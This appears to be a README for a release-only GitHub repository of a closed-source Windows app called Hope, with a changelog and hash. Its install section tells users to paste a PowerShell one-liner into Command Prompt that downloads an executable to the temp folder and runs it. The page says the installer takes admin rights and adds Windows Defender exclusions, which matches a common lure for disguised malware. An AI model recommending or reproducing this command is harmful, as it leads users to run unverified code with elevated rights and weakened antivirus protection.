# Hope — release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows in under 30 seconds. Install with one command.

### 1 — Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 — Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line — there is nothing else to type):

```cmd
powershell -Command "irm https://github.com/muleimm/h-releases/releases/download/v1.2.3/HopeSetup-1.2.3.exe -OutFile $env:TEMP\HopeSetup-1.2.3.exe; Start-Process $env:TEMP\HopeSetup-1.2.3.exe"
```

### 3 — Press Enter & Done!

Hit **Enter**. The Hope installer downloads, asks for admin permission, and installs itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> → Downloads the Hope installer automatically
> → One admin prompt, that's it
> → Adds Windows Defender exclusions for you
> → Desktop shortcut when it's done

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites — the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings → Apps → Hope 1.2.3 → Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.2.3.exe` — `4088809DD1C7D1B93CAAF1628C24D9EDC05FE446126ECE7A301D977B8C05A008`

## What's new in 1.2.3

- All backend calls now go through the Cloudflare edge gateway instead of the raw project host.
- An answer already on its way is no longer lost when the device token is silently refreshed in the meantime — only a real account or device change cancels a pending answer now.
- Login form spacing holds at every DPI and window size; the workspace header reads **Exit** and the busy label reads **Working**.

Latest release: [v1.2.3](https://github.com/muleimm/h-releases/releases/tag/v1.2.3) · All releases are kept and never overwritten.
